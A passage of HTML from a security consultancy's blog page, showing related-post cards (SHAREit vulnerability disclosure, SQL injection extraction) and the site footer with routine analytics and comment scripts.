+					<p>Two recently discovered vulnerabilities affecting SHAREit Android application <= v 4.0.38. The first one allows attacker to bypass SHAREit device authentication mechanism, and the other one enables authenticated attacker to download arbitrary files from user's device. Both vulnerabilities were reported to the vendor and patches have been released.
+</p>
+				</div>
+			</a>
+			
+			<div class="entry-author">
+				<a href="https://blog.redforce.io/writer/0xsyndr0me/"><img alt='' src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src='https://secure.gravatar.com/avatar/3259b1db120d424e93f724de7caed137?s=112&#038;d=mm&#038;r=g' src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-srcset='https://secure.gravatar.com/avatar/3259b1db120d424e93f724de7caed137?s=224&#038;d=mm&#038;r=g 2x' class='avatar avatar-112 photo' height='112' width='112' itemprop="image" /><noscript><img alt='' src='https://secure.gravatar.com/avatar/3259b1db120d424e93f724de7caed137?s=112&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/3259b1db120d424e93f724de7caed137?s=224&#038;d=mm&#038;r=g 2x' class='avatar avatar-112 photo' height='112' width='112' itemprop="image" /></noscript></a>
+			</div>
+			
+			<div class="entry-meta">
+								<strong><a href="https://blog.redforce.io/category/mobile-penetration-testing/" rel="category tag">Mobile Penetration Testing</a></strong> &nbsp; • &nbsp;
+								<span class="entry-date">February 25, 2019</span> 
+				<a href="https://blog.redforce.io/shareit-vulnerabilities-enable-unrestricted-access-to-adjacent-devices-files/" class="entry-read-time"><span>&nbsp; • &nbsp;</span>
+					17 min read				</a>
+			</div>
+		</div>
+		
+	</div>		<div class="excerpt has-featured-image">
+		
+				
+			
+				<div class="featured-image-excerpt" style="background-color:">
+			<a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/">
+				<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://blog.redforce.io/storage/2019/02/sqli2-1000x464.jpg" alt="[SQLi] Extracting data without knowing columns names" class="landscape cw-greater thumbnail post-thumbnail" width="1000" height="464" itemprop="image" /><noscript><img src="https://blog.redforce.io/storage/2019/02/sqli2-1000x464.jpg" alt="[SQLi] Extracting data without knowing columns names" class="landscape cw-greater thumbnail post-thumbnail" width="1000" height="464" itemprop="image" /></noscript>			</a>
+		</div>
+				
+		<div class="entry-header">
+			
+			<a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/">
+				<h2>[SQLi] Extracting data without knowing columns names</h2>
+			
+				<div class="entry-excerpt">
+					<p>Extracting data without knowing columns names from MYSQL < 5 or in case of WAF blacklisting sending information_schema in the request
+</p>
+				</div>
+			</a>
+			
+			<div class="entry-author">
+				<a href="https://blog.redforce.io/writer/a-sultan/"><img alt='' src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src='https://secure.gravatar.com/avatar/460d27d634b0ce7332e20f1c67298876?s=112&#038;d=mm&#038;r=g' src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-srcset='https://secure.gravatar.com/avatar/460d27d634b0ce7332e20f1c67298876?s=224&#038;d=mm&#038;r=g 2x' class='avatar avatar-112 photo' height='112' width='112' itemprop="image" /><noscript><img alt='' src='https://secure.gravatar.com/avatar/460d27d634b0ce7332e20f1c67298876?s=112&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/460d27d634b0ce7332e20f1c67298876?s=224&#038;d=mm&#038;r=g 2x' class='avatar avatar-112 photo' height='112' width='112' itemprop="image" /></noscript></a>
+			</div>
+			
+			<div class="entry-meta">
+								<strong><a href="https://blog.redforce.io/category/web-security/" rel="category tag">Web Security</a></strong> &nbsp; • &nbsp;
+								<span class="entry-date">February 9, 2019</span> 
+				<a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/" class="entry-read-time"><span>&nbsp; • &nbsp;</span>
+					7 min read				</a>
+			</div>
+		</div>
+		
+	</div>				</div>
+	</div>
+	
+
+		
+		
+		
+		</div>
+	</main>
+	
+	
+	
+	<footer id="footer">
+		
+		<ul class="social-icons">
+			<li class="facebook"><a href="https://www.facebook.com/RedForce-1098948386913445/" target="_blank"><img src="https://blog.redforce.io/core/views/10fdcdae3c/imgs/social/Facebook-2.svg" alt="" /></a></li>
+	
+
+<li class="twitter"><a href="https://twitter.com/redforcesec" target="_blank"><img src="https://blog.redforce.io/core/views/10fdcdae3c/imgs/social/Twitter.svg" alt="" /></a></li>
+
+<li class="linkedin"><a href="https://www.linkedin.com/company/redforcesec/" target="_blank"><img src="https://blog.redforce.io/core/views/10fdcdae3c/imgs/social/Linkedin-2.svg" alt="" /></a></li>	
+
+
+
+
+
+
+		</ul>
+		
+		<div class="widgets">
+				
+	<div class="widgets">		
+		<div class="widget widget_text"><h3>Who are we</h3>			<div class="textwidget"><p><strong>RedForce</strong> is an information security consultancy firm consists of a team of experts in the offensive security field. We are a service-oriented organization specialized in offensive consultancy services . . . <a href="https://www.redforce.io/about-us.html"><strong>more</strong></a></p>
+</div>
+		</div><div class="widget widget_text"><h3>Contact us</h3>			<div class="textwidget"><p><span class="text-color-light"><strong>Address</strong>:</span> 5th Floor, Golden Mall, 6th Of October, Giza, Egypt.</p>
+<p><strong>Phone</strong>: <a>+20 100 7842 224<br />
+</a><strong>Email</strong>: <a><span class="__cf_email__" data-cfemail="432a2d252c03312627252c3120266d2226">[email&#160;protected]</span></a></p>
+</div>
+		</div>	</div>
+
+		</div>
+		
+		<div class="bottom">
+							<p>Redforce  &copy; Copyright 2021. All rights reserved.</p>
+						
+			<p class="grey"></p>
+		</div>
+	</footer>
+</div>
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">/* <![CDATA[ */ jQuery(document).ready( function() { jQuery.post( "https://blog.redforce.io/response.php", { action : "entry_views", _ajax_nonce : "62c94834f8", post_id : 502 } ); } ); /* ]]> */</script>
+<script type='text/javascript' src='https://blog.redforce.io/lib/js/imagesloaded.min.js'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var ajax_var = {"url":"https:\/\/blog.redforce.io\/response.php","nonce":"9275c9ab5a","template":""};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://blog.redforce.io/core/views/10fdcdae3c/js/waves-scripts.js'></script>
+<script type='text/javascript' src='https://blog.redforce.io/lib/js/comment-reply.min.js'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var countVars = {"disqusShortname":"redforce-blog"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://blog.redforce.io/core/modules/a47eeb41d2/public/js/comment_count.js'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.17"},"disqusIdentifier":"502 http:\/\/blog.redforce.io\/?p=502","disqusShortname":"redforce-blog","disqusTitle":"Attacking HelpDesks Part 1: RCE Chain on DeskPro, with Bitdefender as a Case Study","disqusUrl":"https:\/\/blog.redforce.io\/attacking-helpdesks-part-1-rce-chain-on-deskpro-with-bitdefender-as-case-study\/","postId":"502"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://blog.redforce.io/core/modules/a47eeb41d2/public/js/comment_embed.js'></script>
+<script type='text/javascript' src='https://blog.redforce.io/core/modules/43342bc671/resources/mootools-core-yc.js'></script>
+<script type='text/javascript' src='https://blog.redforce.io/core/modules/43342bc671/resources/EnlighterJS.min.js'></script>
+<script type='text/javascript' src='https://blog.redforce.io/lib/js/wp-embed.min.js'></script>
+<script type='text/javascript' src='https://blog.redforce.io/core/modules/a2174c3e6f/vendor/smooth-scroll/jquery.smooth-scroll.min.js'></script>
+<script type='text/javascript' src='https://blog.redforce.io/core/modules/a2174c3e6f/vendor/js-cookie/js.cookie.min.js'></script>
+<script type='text/javascript' src='https://blog.redforce.io/core/modules/a2174c3e6f/vendor/sticky-kit/jquery.sticky-kit.min.js'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var ezTOC = {"smooth_scroll":"1","visibility_hide_by_default":"1","width":"auto","scroll_offset":"30"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://blog.redforce.io/core/modules/a2174c3e6f/assets/js/front.min.js'></script>
+<script type="text/javascript">/* <![CDATA[ */EnlighterJS_Config = {"selector":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"language":"generic","theme":"enlighter","indent":2,"hover":"hoverEnabled","showLinenumbers":true,"rawButton":true,"infoButton":true,"windowButton":true,"rawcodeDoubleclick":false,"grouping":true,"cryptex":{"enabled":false,"email":"mail@example.tld"}};!function(){var a=function(a){var b="Enlighter Error: ";console.error?console.error(b+a):console.log&&console.log(b+a)};return window.addEvent?"undefined"==typeof EnlighterJS?void a("Javascript Resources not loaded yet!"):"undefined"==typeof EnlighterJS_Config?void a("Configuration not loaded yet!"):void window.addEvent("domready",function(){EnlighterJS.Util.Init(EnlighterJS_Config.selector.block,EnlighterJS_Config.selector.inline,EnlighterJS_Config)}):void a("MooTools Framework not loaded yet!")}();;/* ]]> */</script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-134271712-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-134271712-2');
+</script>
+</body>
+</html>
